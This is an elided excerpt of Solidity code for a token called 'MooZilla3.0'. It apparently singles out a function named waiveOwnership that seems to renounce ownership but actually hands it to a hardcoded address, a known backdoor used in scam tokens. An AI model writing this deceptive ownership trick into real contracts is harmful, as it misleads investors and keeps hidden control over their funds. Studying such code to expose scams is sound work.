...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x95be762a5eC44357da3BB785e41D929ef5a47267);
    }
...
contract MooZilla3 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MooZilla3.0";
    string private _symbol = "MooZilla";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3d8f40366a7e1302a3Ae9842bbBB2fAaf7D7c7D6);
    address payable public teamWalletAddress = payable(0x3d8f40366a7e1302a3Ae9842bbBB2fAaf7D7c7D6);
